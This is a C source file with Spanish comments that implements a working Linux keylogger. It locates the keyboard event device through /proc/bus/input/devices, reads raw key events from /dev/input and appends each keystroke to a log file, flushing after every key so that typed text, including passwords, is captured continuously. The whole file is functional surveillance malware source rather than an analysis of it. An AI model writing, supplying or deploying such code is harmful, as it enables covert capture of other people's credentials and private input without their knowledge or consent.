#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/Nombre_de_usuario/keylogger.txt"

// Mapeo basico de codigos de teclas a caracteres
char *keycodes[] = {
    "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>",
    "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n", "<LCTRL>",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<LSHIFT>", "\\", "z", "x", "c",
    "v", "b", "n", "m", ",", ".", "/", "<RSHIFT>", "*", "<LALT>", " ", "<CAPSLOCK>"
    // Puedes agregar mas codigos de teclas segun sea necesario
};

// Funcion para escribir la tecla en el archivo de log
void log_key(int code, FILE *fp) {
    if (code >= 0 && code < sizeof(keycodes) / sizeof(char*)) {
        fprintf(fp, "%s", keycodes[code]);
    } else {
        fprintf(fp, "<UNKNOWN>");
    }
}

char *getEvent();

int main() {
    struct input_event ev;
    // ruta al directorio de inputs
    static char path_keyboard[20] = "/dev/input/";
    // concatenar variable keyboard
    strcat(path_keyboard, getEvent());
    // eliminar ultimo caracter (breakline)
    path_keyboard[strlen(path_keyboard) - 1] = 0;
    // leer ruta a input
    int device_keyboard = open(path_keyboard, O_RDONLY);
    // imprimir error
    if (device_keyboard == -1) {
        printf("Error al abrir el dispositivo: %d\n", errno);
        return 1;
    }
    // abrir fichero de logs
    FILE *fp = fopen(LOGFILEPATH, "a");
    if (!fp) {
        printf("Error al abrir el archivo de log: %d\n", errno);
        close(device_keyboard);
        return 1;
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) { // Se libera la tecla
            printf("%c\n", ev.code);
            log_key(ev.code, fp);  // Convertir y escribir en el archivo de log
            fflush(fp);  // Asegura que se escriba en el archivo inmediatamente
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent() {
    // leer el fichero devices y extraer el input que se refiera al teclado
    char *command = "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    // obtener la cadena de texto del evento correspondiente al teclado
    fgets(event, 8, pipe);
    pclose(pipe);
    // retornar el evento
    return event;
}
